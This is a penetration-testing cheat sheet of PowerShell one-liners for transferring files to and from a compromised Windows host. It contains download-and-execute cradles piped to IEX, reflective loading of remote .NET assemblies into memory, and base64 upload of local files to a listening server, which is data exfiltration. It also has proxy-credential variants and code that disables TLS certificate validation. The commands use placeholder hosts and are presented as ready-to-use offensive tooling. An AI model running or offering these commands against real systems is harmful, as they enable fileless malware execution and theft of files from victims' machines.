# pwsh

% powershell, download

#plateform/windows #target/remote #cat/UTILS/FILE_TRANSFERT #tag/powershell 


## file transfert - download on disk (csharp)
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<windows_writable_path>\<dest_file>')
```
## file transfert - proxied download on disk (csharp)
```powershell
$w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("http://<proxy_server>:<proxy_port>",$true); $w.proxy.Credentials = New-Object System.Net.NetworkCredential("<proxy_login>", "<proxy_password>"); $w.DownloadFile('http://<server>/<source_file>','<windows_writable_path>\<dest_file>')
```

## file transfert - download on disk (powershell)
```powershell
Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>\<dest_file>
```

## file transfert - proxied download on disk (powershell)
```powershell
Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>/<dest_file> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force)))
```

## file transfert - download and import script (csharp)
```powershell
(new-object system.net.webclient).downloadstring('http://<server>/<script>') | IEX
```

## file transfert - proxied download and import script (csharp)
```powershell
$w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("http://<proxy_server>:<proxy_port>",$true); $w.proxy.Credentials = New-Object System.Net.NetworkCredential("<proxy_login>", "<proxy_password>"); $w.downloadstring('http://<server>/<script>') | IEX
```

## file transfert - download and import script (powershell)
```powershell
Invoke-WebRequest -URI http://<server>/<script> | IEX
```

## file transfert - proxied download and import script (powershell)
```powershell
Invoke-WebRequest -URI http://<server>/<script> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force))) | IEX
```

## file transfert - download csharp into memory (Assembly reflection)
```powershell
$d = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>'); $asm = [System.Reflection.Assembly]::Load($d); 
```

## file transfert - download gziped csharp into memory (Assembly reflection)
```powershell
$b64 = (New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>');$c=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String($b64));$d = New-Object IO.Compression.GzipStream($c,[IO.Compression.CoMPressionMode]::DEComPress);$asm = [System.Reflection.Assembly]::Load($d); 
```

## file transfert - run csharp from memory (Assembly reflection) 
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
= asm_ref_params: -group=user -full

## file transfert - upload base64 (in-memory)
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path '<file>' -Encoding Byte));Invoke-RestMethod -Uri http://<server>/ -Method POST -Body $b64
```

## file transfert - upload base64 (file creation)
catch with nc then echo <base64> | base64 -d -w 0 > hosts
```powershell
certutil -encode <infile> <outfile>; $base64str = Get-Content <outfile> && Invoke-RestMethod -Uri http://<server>/ -Method POST -Body $base64str
```


## file transfert - bypass certificat validation
```powershell
 add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
```